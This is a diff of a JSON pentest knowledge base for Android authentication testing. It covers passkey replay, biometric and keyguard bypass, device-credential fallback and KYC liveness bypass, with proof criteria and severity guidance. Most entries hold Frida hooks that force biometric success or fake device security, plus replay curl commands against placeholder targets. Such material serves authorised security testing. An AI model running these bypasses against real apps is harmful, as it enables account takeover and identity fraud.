+   "how": "```bash\ngrep -rn 'CredentialManager\\|GetCredentialRequest\\|GetPublicKeyCredentialOption\\|CreatePublicKeyCredentialRequest\\|PasswordOption\\|requestJson' $DEC/jadx/sources\n# the credential-sharing association is a DIFFERENT relation from link handling — check the right one\ncurl -s https://target.example/.well-known/assetlinks.json \\\n  | jq '.[] | select(.relation[] | contains(\"get_login_creds\"))'\napksigner verify --print-certs base.apk | grep -i 'SHA-256'      # must match the assetlinks fingerprint\n# then proxy the registration/assertion and replay\ncurl -s -X POST https://api.target/v1/webauthn/verify -H \"Cookie: session=$SECOND_SESSION\" \\\n  -H 'Content-Type: application/json' --data @assertion_from_first_session.json -i\n```",
    "proof": "The same assertion accepted in a second session, or the same `challenge` accepted twice — both requests captured in Burp. For the origin half: an `assetlinks.json` whose `sha256_cert_fingerprints` does not match the production signing certificate, or a `get_login_creds` delegation to a host the client does not control.",
    "escalation": "→ ATO despite hardware-backed MFA. Combine with the WebView variant: a WebView that can be navigated to an attacker origin and still triggers `getCredential` for the app's RP id is a credential-phishing primitive (→ D10).",
    "ruled_out_when": "Each challenge is server-generated, single-use and session-bound (the replay returns a challenge-mismatch error), `rpId` is fixed server-side, and the `get_login_creds` statement lists only the production signing certificate. Do not conflate the two Digital Asset Links relations: `common.get_login_creds` governs credential sharing and `common.handle_all_urls` governs link handling — confusing them silently breaks one of them."
@@ -3261,8 +3413,11 @@
     "AM-11"
    ],
    "applies_to": "Apps mid-migration to Credential Manager — very common in current releases; and apps adopting Restore Credentials",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, device",
+   "requires_tags": [
+    "backend-api",
+    "device"
+   ],
    "maps_to": "`developer.android.com/identity/sign-in/credential-manager` (migration guides from \"Google Sign-In, Smart Lock, FIDO2\"; \"Integration with Restore Credentials API for seamless sign-in on new devices\")",
    "record": "",
    "legacy_meta": {},
@@ -3285,7 +3440,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Apps migrating to Credential Manager frequently keep the legacy path (Smart Lock, the FIDO2 API, Google Sign-In) as a fallback, and the fallback usually lacks the origin binding and phishing resistance of the passkey path. Separately, any flow that re-establishes an authenticated session on a *different* device without a fresh user-verification step is worth probing: what binds the restored credential to the user rather than to the backup?",
-   "how": "```bash\ngrep -rn 'androidx.credentials\\|CredentialManager' jadx_out/sources | head\ngrep -rn 'Fido2ApiClient\\|CredentialsApi\\|GoogleSignInClient\\|SmartLock' jadx_out/sources\ngrep -rn -i 'restorecredential\\|RestoreCredential\\|restore_credential' jadx_out/sources\n```\nForce the fallback by making the Credential Manager call fail:\n```js\nJava.perform(function () {\n  var CM = Java.use('androidx.credentials.CredentialManager');\n  CM.getCredential.overloads.forEach(function (o) {\n    o.implementation = function () { throw Java.use('java.lang.RuntimeException').$new('forced'); };\n  });\n});\n```\nThen perform a device-to-device restore into a second device/emulator and see whether the app lands authenticated.",
+   "how": "```bash\ngrep -rn 'androidx.credentials\\|CredentialManager' $DEC/jadx/sources | head\ngrep -rn 'Fido2ApiClient\\|CredentialsApi\\|GoogleSignInClient\\|SmartLock' $DEC/jadx/sources\ngrep -rn -i 'restorecredential\\|RestoreCredential\\|restore_credential' $DEC/jadx/sources\n```\nForce the fallback by making the Credential Manager call fail:\n```js\nJava.perform(function () {\n  var CM = Java.use('androidx.credentials.CredentialManager');\n  CM.getCredential.overloads.forEach(function (o) {\n    o.implementation = function () { throw Java.use('java.lang.RuntimeException').$new('forced'); };\n  });\n});\n```\nThen perform a device-to-device restore into a second device/emulator and see whether the app lands authenticated.",
    "proof": "The legacy path completing a sign-in with a credential the passkey path would have refused (wrong origin, no user verification); or an authenticated session present on a freshly restored device with no biometric/PIN step.",
    "escalation": "→ D02/D11 (backup extraction) → account takeover. The strongest authenticator the app ships is worth exactly what its weakest fallback is worth.",
    "ruled_out_when": "The Credential Manager failure produces an error state rather than a legacy sign-in, and a restored session requires fresh user verification before it becomes usable. Test the forced-failure path explicitly — the fallback is invisible on a device where the primary path works."
@@ -3306,8 +3461,12 @@
     "AM-11"
    ],
    "applies_to": "All. `androidx.biometric.BiometricPrompt` back-ports to **API 23**; `android.hardware.biometrics.BiometricPrompt` is **API 28+**; `FingerprintManager` is deprecated at API 28 and is where the callback-boolean pattern is most common — mark it **LEGACY**",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "biometric, device, frida",
+   "requires_tags": [
+    "biometric",
+    "device",
+    "frida"
+   ],
    "maps_to": "MASTG-TEST-0327 (References to APIs for Event-Bound Biometric Authentication), LEGACY-ID MASTG-TEST-0018 (deprecated), MASTG-TEST-0017 (Testing Confirm Credentials); MASWE-0020 (CWE-285, 287, 312, 319, 326, 602, 603, 863, 922); MASVS-AUTH-2; MASTG-KNOW-0001/0012/0043/0047, MASTG-BEST-0036; rule `mastg-android-biometric-event-bound`; mobsfscan `android_biometric_without_crypto` / `android_kotlin_biometric_without_crypto`; ATT&CK T1461, T1617; H1 #637194 (Shopify)",
    "record": "",
    "legacy_meta": {},
@@ -3354,7 +3513,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The load-bearing distinction in this whole sub-domain. `authenticate(promptInfo)` yields a boolean delivered to `onAuthenticationSucceeded`; `authenticate(promptInfo, CryptoObject(cipher))` yields an object whose key only an authenticated user could unlock. If the app takes the **callback** as the authorisation and then reads a token from unprotected storage, the entire gate is a branch in app code. MASTG-TEST-0327 fails only when *both* conditions hold: `authenticate` lacks a `CryptoObject` **and** there are no calls to key generation with `setUserAuthenticationRequired(true)` in conjunction with biometric authentication.",
-   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-event-bound.yml jadx_out/sources/\ngrep -rnE 'biometricPrompt\\.authenticate\\(|BiometricPrompt\\.CryptoObject|onAuthenticationSucceeded|result\\.getCryptoObject|result\\.cryptoObject|setUserAuthenticationRequired' jadx_out/sources/ -A4\ngrep -rn 'onAuthenticationSucceeded' jadx_out/sources/ -A25 | grep -n 'getCryptoObject'   # is it ever READ?\n```\nConfirm the argument count at runtime, then force the callback:\n```js\nJava.perform(function () {\n  var BP = Java.use('androidx.biometric.BiometricPrompt');\n  BP.authenticate.overloads.forEach(function (o) {\n    o.implementation = function () {\n      console.log('[authenticate] argc=' + arguments.length +\n                  ' cryptoObject=' + (arguments.length > 1 ? arguments[1] : 'NONE'));\n      return o.apply(this, arguments);\n    };\n  });\n  var CB = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');\n  CB.onAuthenticationSucceeded.implementation = function (r) {\n    console.log('[+] forcing biometric success'); return this.onAuthenticationSucceeded(r);\n  };\n});\n```\n```bash\nobjection -g com.target.app explore\nandroid hooking watch class_method androidx.biometric.BiometricPrompt.authenticate --dump-args\nandroid keystore detail                     # D12: what key was the prompt supposed to unlock?\n```",
+   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-event-bound.yml $DEC/jadx/sources/\ngrep -rnE 'biometricPrompt\\.authenticate\\(|BiometricPrompt\\.CryptoObject|onAuthenticationSucceeded|result\\.getCryptoObject|result\\.cryptoObject|setUserAuthenticationRequired' $DEC/jadx/sources/ -A4\ngrep -rn 'onAuthenticationSucceeded' $DEC/jadx/sources/ -A25 | grep -n 'getCryptoObject'   # is it ever READ?\n```\nConfirm the argument count at runtime, then force the callback:\n```js\nJava.perform(function () {\n  var BP = Java.use('androidx.biometric.BiometricPrompt');\n  BP.authenticate.overloads.forEach(function (o) {\n    o.implementation = function () {\n      console.log('[authenticate] argc=' + arguments.length +\n                  ' cryptoObject=' + (arguments.length > 1 ? arguments[1] : 'NONE'));\n      return o.apply(this, arguments);\n    };\n  });\n  var CB = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');\n  CB.onAuthenticationSucceeded.implementation = function (r) {\n    console.log('[+] forcing biometric success'); return this.onAuthenticationSucceeded(r);\n  };\n});\n```\n```bash\nobjection -g com.target.app explore\nandroid hooking watch class_method androidx.biometric.BiometricPrompt.authenticate --dump-args\nandroid keystore detail                     # D12: what key was the prompt supposed to unlock?\n```",
    "proof": "`cryptoObject=NONE` in the log, the protected screen opening with **no system biometric dialog ever appearing**, and the underlying data rendering **legibly** (not ciphertext) — that silence plus that legibility is the evidence nothing cryptographic depended on the biometric. Screen-record it. The contrast case is what proves a correct implementation: a `CryptoObject`-backed gate fails with `KeyPermanentlyInvalidatedException` / `UserNotAuthenticatedException`, or renders encrypted garbage.",
    "escalation": "→ whatever the gate protected: D11 (the released secret), D12 (the Keystore alias), D23 (payment authorisation), and D13-010 (does the released token work off-device?). Frame it for triage as \"the authentication decision is not cryptographically bound, so any code-execution primitive in the process is an auth bypass\" — **not** \"root detection bypassed\".",
    "ruled_out_when": "A `CryptoObject` is supplied, the callback actually reads `result.getCryptoObject()` and uses the resulting `Cipher`/`Mac`/`Signature` to unwrap the real secret, **and** the key was generated with `setUserAuthenticationRequired(true)` — under which the forced callback surfaces the UI but decryption still fails. Record that negative with the exception text; it is a passing control worth reporting. Two reporting cautions: demonstrate on a **physical** device (a Frida-on-emulator demo invites a \"not a real-world bypass\" rebuttal), and state the injection precondition honestly — Frida needs a rooted/debuggable environment or a Gadget-repackaged APK."
@@ -3375,8 +3534,12 @@
     "AM-11"
    ],
    "applies_to": "All apps using `BiometricPrompt` / `FingerprintManager` with a crypto object",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "biometric, device, frida",
+   "requires_tags": [
+    "biometric",
+    "device",
+    "frida"
+   ],
    "maps_to": "HackTricks `bypass-biometric-authentication-android.md` Method 2 (WithSecure `fingerprint-bypass-via-exception-handling.js`); SEC Consult's three classes — (1) No Use of Crypto, (2) **Improper Use of Crypto**, (3) Data not Crucial for Authentication; mindedsecurity `MSTG-AUTH-8` rule (`pattern-not-inside` requiring `$CIP = $RES.getCryptoObject().getCipher();`)",
    "record": "",
    "legacy_meta": {},
@@ -3398,7 +3561,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Class 2. Even with a `CryptoObject`, an app that does not use the *authorised* cipher for the protected data can be driven through `onAuthenticationSucceeded` with an unauthorised object. The Semgrep-shaped question is whether the success handler actually assigns from `result.getCryptoObject().getCipher()` and then uses that instance.",
-   "how": "```bash\nfrida -U -f com.target.app --no-pause -l fingerprint-bypass-via-exception-handling.js\n# reach the fingerprint screen so authenticate() is called, then in the Frida console:\n> bypass()\n```\nThe script prepares `onAuthenticationSucceeded` and handles `javax.crypto.IllegalBlockSizeException` in `Cipher`, so subsequent objects the app uses are encrypted with the new key.\n```bash\n# static confirmation of the class\ngrep -rn 'onAuthenticationSucceeded' jadx_out/sources/ -A25 \\\n  | grep -nE 'getCryptoObject\\(\\)\\.getCipher\\(\\)|doFinal|unwrap|init\\(Cipher\\.'\n```",
+   "how": "```bash\nfrida -D \"$SERIAL\" -f com.target.app -l fingerprint-bypass-via-exception-handling.js\n# reach the fingerprint screen so authenticate() is called, then in the Frida console:\n> bypass()\n```\nThe script prepares `onAuthenticationSucceeded` and handles `javax.crypto.IllegalBlockSizeException` in `Cipher`, so subsequent objects the app uses are encrypted with the new key.\n```bash\n# static confirmation of the class\ngrep -rn 'onAuthenticationSucceeded' $DEC/jadx/sources/ -A25 \\\n  | grep -nE 'getCryptoObject\\(\\)\\.getCipher\\(\\)|doFinal|unwrap|init\\(Cipher\\.'\n```",
    "proof": "Console showing `Hooking BiometricPrompt.authenticate()... / Hooking FingerprintManager.authenticate()...`, `bypass()` returning, and the protected feature unlocking — with the decompiled success handler showing that the authorised cipher is obtained and discarded, or never obtained at all.",
    "escalation": "As D13-074. The correct fix to recommend is precise: reject a `CryptoObject` with a null or unexpected cipher/signature and treat it as a fatal authentication error.",
    "ruled_out_when": "The success handler assigns the cipher from the result and uses **that instance** to decrypt the protected material, so an unauthorised object throws rather than yielding plaintext. Distinguish SEC Consult's class 3 before writing: if the data behind the gate is not crucial for authentication and is separately protected, the bypass is Low-to-informational — that class exists precisely to stop over-claiming."
@@ -3418,8 +3581,11 @@
     "AM-11"
    ],
    "applies_to": "`setInvalidatedByBiometricEnrollment` is **API 24+**; the default is `true` (secure) — any explicit `false` is the finding",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "biometric, physical",
+   "requires_tags": [
+    "biometric",
+    "physical"
+   ],
    "maps_to": "MASTG-TEST-0328 (References to APIs Detecting Biometric Enrollment Changes); MASWE-0022 (Crypto Keys Not Invalidated on New Biometric Enrollment, CWE-287, CWE-522); MASVS-AUTH-2, MASVS-CRYPTO-2; MASTG-KNOW-0001, MASTG-BEST-0037; rule `mastg-android-biometric-invalidated-enrollment`; Oversecured banking-ATO item 8",
    "record": "",
    "legacy_meta": {},
@@ -3455,7 +3621,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "With `setInvalidatedByBiometricEnrollment(false)`, an attacker who obtains the device passcode can enrol **their own** fingerprint or face in Settings and then unlock the app's keys with it. This is the strongest biometric PoC in the chapter because it needs **no instrumentation at all**.",
-   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-invalidated-enrollment.yml jadx_out/sources/\ngrep -rn 'KeyGenParameterSpec.Builder' jadx_out/sources/ -A20 \\\n  | grep -nE 'setUserAuthenticationRequired|setInvalidatedByBiometricEnrollment|setUserAuthenticationParameters|setUserAuthenticationValidityDurationSeconds'\n# practical PoC, unmodified device, app already logged in:\n# Settings > Security > Fingerprint > Add a fingerprint, then reopen the app and authenticate with the NEW finger\n```",
+   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-invalidated-enrollment.yml $DEC/jadx/sources/\ngrep -rn 'KeyGenParameterSpec.Builder' $DEC/jadx/sources/ -A20 \\\n  | grep -nE 'setUserAuthenticationRequired|setInvalidatedByBiometricEnrollment|setUserAuthenticationParameters|setUserAuthenticationValidityDurationSeconds'\n# practical PoC, unmodified device, app already logged in:\n# Settings > Security > Fingerprint > Add a fingerprint, then reopen the app and authenticate with the NEW finger\n```",
    "proof": "Authenticating into the app with a biometric enrolled **after** the app's key was created, on an unmodified retail device, and reaching the protected data — with no `KeyPermanentlyInvalidatedException`. Record both steps on video: the enrolment in Settings, then the unlock.",
    "escalation": "Full account access on a stolen, borrowed or serviced device. Pair with D13-077 (device-credential fallback): together they mean the biometric gate reduces to the device PIN.",
    "ruled_out_when": "The key is built with `setInvalidatedByBiometricEnrollment(true)` (or the flag is absent, so the secure default applies) and the app throws `KeyPermanentlyInvalidatedException` after a new enrolment, forcing re-authentication with the primary credential. Demonstrate the exception rather than inferring it from source."
@@ -3475,8 +3641,11 @@
     "AM-11"
    ],
    "applies_to": "`setAllowedAuthenticators` is **API 30+**; `setDeviceCredentialAllowed` is deprecated at API 30 — mark it **LEGACY**; the biometric class model dates from Android 10",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "biometric, device",
+   "requires_tags": [
+    "biometric",
+    "device"
+   ],
    "maps_to": "MASTG-TEST-0326 (References to APIs Allowing Fallback to Non-Biometric Authentication); MASWE-0021 (CWE-287, CWE-288); MASVS-AUTH-2; MASTG-BEST-0031; rule `mastg-android-biometric-device-credential-fallback`; `source.android.com/docs/security/features/biometric` capability table; AOSP security-model paper §4.2.1 (Class 3: SAR < 7%; Class 2: 7% < SAR < 20%; Class 1: SAR > 20% or an insecure pipeline; all classes FAR ≤ 1/50000 and FRR < 10%; \"Only Class 3 biometrics can unlock Keymint auth-bound keys and only Class 3 and 2 can be used for in-app authentication\"); HackTricks Method 7",
    "record": "",
    "legacy_meta": {},
@@ -3511,7 +3680,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Three related weakenings. (a) `setAllowedAuthenticators(... | DEVICE_CREDENTIAL)` or `setDeviceCredentialAllowed(true)` lets the device PIN stand in for the biometric. (b) `BIOMETRIC_WEAK` (Class 2) **cannot unlock Keystore keys at all**, so an app accepting Class 2 for payment authorisation is by construction using D13-074's UI check. (c) The `DEVICE_CREDENTIAL` path may be implemented as a *second*, bare `createConfirmDeviceCredentialIntent()` + `onActivityResult(RESULT_OK)` branch — which reintroduces the callback bypass through the fallback.",
-   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-device-credential-fallback.yml jadx_out/sources/\ngrep -rnE 'setAllowedAuthenticators\\(|BIOMETRIC_STRONG|BIOMETRIC_WEAK|BIOMETRIC_CONVENIENCE|DEVICE_CREDENTIAL|setDeviceCredentialAllowed|setNegativeButtonText' jadx_out/sources/\ngrep -rn -A10 'setAllowedAuthenticators' jadx_out/sources/ | grep -nE 'CryptoObject|createConfirmDeviceCredentialIntent'\nadb shell dumpsys biometric | head -40\n```\nForce the downgrade to confirm it is not merely declared:\n```js\nvar B = Java.use('androidx.biometric.BiometricPrompt$PromptInfo$Builder');\nB.setAllowedAuthenticators.implementation = function (flags) {\n  return this.setAllowedAuthenticators(0x00FF | 0x8000);   // BIOMETRIC_WEAK | DEVICE_CREDENTIAL\n};\n```",
+   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-device-credential-fallback.yml $DEC/jadx/sources/\ngrep -rnE 'setAllowedAuthenticators\\(|BIOMETRIC_STRONG|BIOMETRIC_WEAK|BIOMETRIC_CONVENIENCE|DEVICE_CREDENTIAL|setDeviceCredentialAllowed|setNegativeButtonText' $DEC/jadx/sources/\ngrep -rn -A10 'setAllowedAuthenticators' $DEC/jadx/sources/ | grep -nE 'CryptoObject|createConfirmDeviceCredentialIntent'\nadb shell dumpsys biometric | head -40\n```\nForce the downgrade to confirm it is not merely declared:\n```js\nvar B = Java.use('androidx.biometric.BiometricPrompt$PromptInfo$Builder');\nB.setAllowedAuthenticators.implementation = function (flags) {\n  return this.setAllowedAuthenticators(0x00FF | 0x8000);   // BIOMETRIC_WEAK | DEVICE_CREDENTIAL\n};\n```",
    "proof": "The prompt offering the device-credential fallback (or accepting a weak biometric) on a flow the app declared strong-only, **and** the sensitive action completing. For (c): two distinct code paths, where hooking the `onActivityResult` branch yields the same access as the biometric branch.",
    "escalation": "Combine with a shoulder-surfed or known PIN plus D13-076 for a full chain; → D23 where it authorises payments.",
    "ruled_out_when": "The high-value path requests `BIOMETRIC_STRONG` only, the result is `CryptoObject`-bound, and the `DEVICE_CREDENTIAL` branch (where present) is itself `CryptoObject`-bound rather than a bare `RESULT_OK` check. Be precise about severity: MASTG itself says using `DEVICE_CREDENTIAL` \"is not inherently a vulnerability… better categorized as a security weakness or hardening issue, not a critical vulnerability\" — report it Low on most programs, Medium for finance/health/government, never Critical. Record the documented root cause too: mixing `DEVICE_CREDENTIAL` with a `CryptoObject` is unsupported, which is *why* many apps drop the CryptoObject."
@@ -3531,8 +3700,11 @@
     "AM-11"
    ],
    "applies_to": "`setConfirmationRequired` default is `true`; `setUserAuthenticationParameters` is **API 30+**, `setUserAuthenticationValidityDurationSeconds` deprecated at API 30 — **LEGACY**; duration `0` is the secure per-operation configuration",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "biometric, device",
+   "requires_tags": [
+    "biometric",
+    "device"
+   ],
    "maps_to": "MASTG-TEST-0329 (References to APIs Enforcing Authentication without Explicit User Action), MASTG-TEST-0330 (Keys used in Biometric Authentication with Extended Validity Duration); MASWE-0020, MASWE-0016; MASVS-AUTH-2, MASVS-CRYPTO-2; MASTG-BEST-0038, MASTG-BEST-0036; rules `mastg-android-biometric-no-confirmation-required`, `mastg-android-biometric-validity-duration`",
    "record": "",
    "legacy_meta": {},
@@ -3566,7 +3738,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Two configuration weakenings that compound. With `setConfirmationRequired(false)`, a passive biometric (face/iris) authenticates with **no explicit user action** — the user need not intend the action at all. With a validity duration `> 0`, one successful authentication authorises key use for that entire window.",
-   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-no-confirmation-required.yml jadx_out/sources/\nsemgrep -c rules/mastg-android-biometric-validity-duration.yml jadx_out/sources/\ngrep -rnE 'setConfirmationRequired\\(|setUserAuthenticationParameters\\(|setUserAuthenticationValidityDurationSeconds\\(' jadx_out/sources/\n```\nPoC: authenticate once, then perform the protected operation **repeatedly** inside the configured window with no further prompt; and, for the confirmation half, complete the action on passive face recognition alone with no tap.",
+   "how": "```bash\nsemgrep -c rules/mastg-android-biometric-no-confirmation-required.yml $DEC/jadx/sources/\nsemgrep -c rules/mastg-android-biometric-validity-duration.yml $DEC/jadx/sources/\ngrep -rnE 'setConfirmationRequired\\(|setUserAuthenticationParameters\\(|setUserAuthenticationValidityDurationSeconds\\(' $DEC/jadx/sources/\n```\nPoC: authenticate once, then perform the protected operation **repeatedly** inside the configured window with no further prompt; and, for the confirmation half, complete the action on passive face recognition alone with no tap.",
    "proof": "A second and third privileged operation succeeding with no prompt, timed inside the window, with the configured duration quoted from the decompiled code; and a screen recording of the action completing on a passive match with no deliberate confirmation.",
    "escalation": "→ D23 (repeated transactions on a single unlock). Pair the two: together they mean a passive biometric match can authorise a payment with no deliberate user action, and then authorise several more.",
    "ruled_out_when": "`setConfirmationRequired` is left at its default `true` (or explicitly `true`) on every sensitive path, and the validity duration is `0` so every operation re-authenticates. MASTG is explicit that `setConfirmationRequired(false)` \"is not inherently a vulnerability… may be appropriate for low-risk operations\" — escalate only for payments or data release, and scale the duration finding by the window (seconds = acceptable; minutes or hours = High)."
@@ -3587,8 +3759,11 @@
     "AM-11"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, physical",
+   "requires_tags": [
+    "device",
+    "physical"
+   ],
    "maps_to": "`KeyguardManager.requestDismissKeyguard` javadoc (the request succeeds only if the activity \"must either be visible by using `android.R.attr#showWhenLocked` or `Activity#setShowWhenLocked(boolean)`\" — a *visibility* API, not an authentication API); `isKeyguardLocked` javadoc (\"This method does not distinguish a lock screen that is requiring authentication … from a lock screen that is trivially dismissible (e.g. with swipe)\"); MASTG-TEST-0247, MASTG-TEST-0249, MASTG-TEST-0012 (deprecated v1); MASWE-0017; rule `mastg-android-device-passcode-present`; AOSP security-model paper §4.2.1 on tertiary modalities",
    "record": "",
    "legacy_meta": {},
@@ -3620,7 +3795,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Apps sometimes gate a sensitive screen on \"the keyguard was dismissed\" or \"the device is secure\" rather than on a `BiometricPrompt` result or an auth-bound key. On a swipe-only or no-lock device the keyguard dismisses with **no credential at all**, so the gate passes for anyone holding the phone. The same weakness covers tertiary modalities: Smart Lock / trusted place / trusted device hold a device unlocked for extended periods and cannot release auth-bound keys.",
-   "how": "```bash\ngrep -rnE 'requestDismissKeyguard|KeyguardDismissCallback|onDismissSucceeded|FLAG_DISMISS_KEYGUARD' jadx_out/sources/ -A12\ngrep -rnE 'isDeviceSecure\\(|isKeyguardSecure\\(|isKeyguardLocked\\(|isDeviceLocked\\(|canAuthenticate\\(' jadx_out/sources/\nsemgrep -c rules/mastg-android-device-passcode-present.yml jadx_out/sources/\n# set the device to swipe-only, then reach the screen\nadb shell locksettings clear --old <pin>\nadb shell locksettings set-disabled false\n```\nThen hook the gate to show it is the sole check:\n```js\nJava.perform(function () {\n  var KM = Java.use('android.app.KeyguardManager');\n  KM.isDeviceSecure.overload().implementation = function () { console.log('[kg] forced true'); return true; };\n});\n```",
+   "how": "```bash\ngrep -rnE 'requestDismissKeyguard|KeyguardDismissCallback|onDismissSucceeded|FLAG_DISMISS_KEYGUARD' $DEC/jadx/sources/ -A12\ngrep -rnE 'isDeviceSecure\\(|isKeyguardSecure\\(|isKeyguardLocked\\(|isDeviceLocked\\(|canAuthenticate\\(' $DEC/jadx/sources/\nsemgrep -c rules/mastg-android-device-passcode-present.yml $DEC/jadx/sources/\n# set the device to swipe-only, then reach the screen\nadb shell locksettings clear --old <pin>\nadb shell locksettings set-disabled false\n```\nThen hook the gate to show it is the sole check:\n```js\nJava.perform(function () {\n  var KM = Java.use('android.app.KeyguardManager');\n  KM.isDeviceSecure.overload().implementation = function () { console.log('[kg] forced true'); return true; };\n});\n```",
    "proof": "`onDismissSucceeded` firing (Frida hook or logcat) on a device with **no** credential, followed by the protected screen rendering real data. Or, with an extend-unlock mechanism active, the protected flow completing with no authentication event in the session at all.",
    "escalation": "Chains directly with D04 `showWhenLocked` (the activity has to be lock-screen-visible for the dismiss to succeed at all) and with D11/D12 once the gate releases key material.",
    "ruled_out_when": "The gate is a `BiometricPrompt` result bound to a `CryptoObject`, or the app's own secret is wrapped by a key with `setUserAuthenticationRequired(true)` — so a dismissed keyguard on a credential-less device releases nothing. Note the severity honesty: \"the app does not check for a device passcode\" is Informational-to-Low standalone under most rating schemes, and MASTG observes apps \"cannot force users to enable biometrics at the system level\". Report the **bypass**, showing the check exists, is the sole gate, and is trivially hooked or trivially satisfied."
@@ -3641,8 +3816,11 @@
     "AM-12"
    ],
    "applies_to": "All apps offering an in-app lock",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, frida",
+   "requires_tags": [
+    "device",
+    "frida"
+   ],
    "maps_to": "H1 #50884, #331489 (Nextcloud), #490946, #747726, #1242212 (MEW Wallet PIN bypass, Android), #637194; \"Android pin bypass with rate limiting\"; CVE-2024-26131 (Element Android — WebView manipulation, PIN bypass, login hijack); MHL labs `lab-secure-notes`, `lab-tidelock-ctf`",
    "record": "",
    "legacy_meta": {},
@@ -3689,8 +3867,11 @@
     "AM-12"
    ],
    "applies_to": "Apps performing client-side identity or liveness decisions",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, frida",
+   "requires_tags": [
+    "device",
+    "frida"
+   ],
    "maps_to": "MHL lab `lab-kyc-me-if-you-can` — \"Bypass ML-based face recognition inside a KYC identity verification app\" (Android, advanced; tags Biometric Bypass, AI Security)",
    "record": "",
    "legacy_meta": {},
@@ -3713,7 +3894,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A KYC or liveness check implemented client-side is a classification decision you can influence three ways: inject camera frames, hook the classifier's result method, or replace the model asset.",
-   "how": "```bash\n# locate the model and the decision boundary\nunzip -l base.apk | grep -iE '\\.tflite|\\.onnx|\\.pb$|\\.mlmodel|assets/.*model'\ngrep -rnE 'Interpreter|tflite|FaceDetector|liveness|livenessScore|matchScore|threshold|confidence' jadx_out/sources\n# hook the classifier's verdict\nfrida -U -f com.target.app -l hook_liveness.js --no-pause\n# or feed the camera pipeline a prepared image (virtual camera / Camera2 hook)\n```",
+   "how": "```bash\n# locate the model and the decision boundary\nunzip -l base.apk | grep -iE '\\.tflite|\\.onnx|\\.pb$|\\.mlmodel|assets/.*model'\ngrep -rnE 'Interpreter|tflite|FaceDetector|liveness|livenessScore|matchScore|threshold|confidence' $DEC/jadx/sources\n# hook the classifier's verdict\nfrida -D \"$SERIAL\" -f com.target.app -l hook_liveness.js\n# or feed the camera pipeline a prepared image (virtual camera / Camera2 hook)\n```",
    "proof": "Identity verification passing for an image that is not the enrolled subject — recorded end to end — **and** the server accepting the resulting verified state (check `/me` for `kyc_status` flipping).",
    "escalation": "→ D23 (fraud, payouts, limit raises) → D15. This is identity-fraud enablement, not a UI bug; frame it that way.",
    "ruled_out_when": "The frames or the liveness challenge are uploaded and adjudicated **server-side**, and a hooked client verdict does not change `kyc_status`. Check the server's own response rather than the app's screen: a client that renders \"verified\" while the backend still says `pending` is a cosmetic bypass."
@@ -3734,8 +3915,16 @@
     "AM-11"
    ],
    "applies_to": "React Native, Flutter, Capacitor, Unity; the OTA half applies to CodePush / expo-updates",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "flutter, react-native, hermes, capacitor, cordova, unity, device",
+   "requires_tags": [
+    "flutter",
+    "react-native",
+    "hermes",
+    "capacitor",
+    "cordova",
+    "unity",
+    "device"
+   ],
    "maps_to": "expo `UpdatesConfiguration.kt` (`CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`); CodePush `CodePush.java` (`mPublicKey` unset ⇒ no bundle JWT verification)",
    "record": "",
    "legacy_meta": {},
@@ -3759,7 +3948,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "In cross-platform apps the \"unlock\" decision frequently lives in JS or Dart and only *then* fetches the secret — no cryptographic object is bound to the prompt, so the gate is a branch you can flip. Worse: if the app can be updated over the air and that channel is unauthenticated, all client-side auth logic is attacker-mutable.",
-   "how": "```bash\n# React Native\ngrep -aiE 'biometric|TouchID|FaceID|isSensorAvailable|simplePrompt|LocalAuthentication|authenticate' \\\n  ext/assets/index.android.bundle\nhermes-decomp xref ext/assets/index.android.bundle --query 'authenticate'\n# Flutter\ngrep -nE 'local_auth|authenticate|BiometricType|canCheckBiometrics' out_dir/asm/*.txt out_dir/pp.txt | head\n# OTA posture (D17)\ngrep -rnE 'CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|expo-updates|CodePush|mPublicKey|deploymentKey' \\\n  jadx_out/sources out/AndroidManifest.xml out/res/values/strings.xml\n```\nThen flip it: patch the bundle, or hook the native module's promise resolve so the auth call returns `{success:true}`.",
+   "how": "```bash\n# React Native\ngrep -aiE 'biometric|TouchID|FaceID|isSensorAvailable|simplePrompt|LocalAuthentication|authenticate' \\\n  ext/assets/index.android.bundle\nhermes-decomp xref ext/assets/index.android.bundle --query 'authenticate'\n# Flutter\ngrep -nE 'local_auth|authenticate|BiometricType|canCheckBiometrics' out_dir/asm/*.txt out_dir/pp.txt | head\n# OTA posture (D17)\ngrep -rnE 'CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|expo-updates|CodePush|mPublicKey|deploymentKey' \\\n  $DEC/jadx/sources out/AndroidManifest.xml out/res/values/strings.xml\n```\nThen flip it: patch the bundle, or hook the native module's promise resolve so the auth call returns `{success:true}`.",
    "proof": "Returning `true` / `{success:true}` from the auth call unlocks the protected screen **and the protected data renders**. For the OTA variant: a victim device, with no reinstall, reaching the authenticated UI after fetching an attacker-served bundle whose login screen calls `onAuthSuccess()` unconditionally.",
    "escalation": "→ D19 (the framework's own surface), D17 (the OTA substitution primitive), D11 (proving the released data is real user data).",
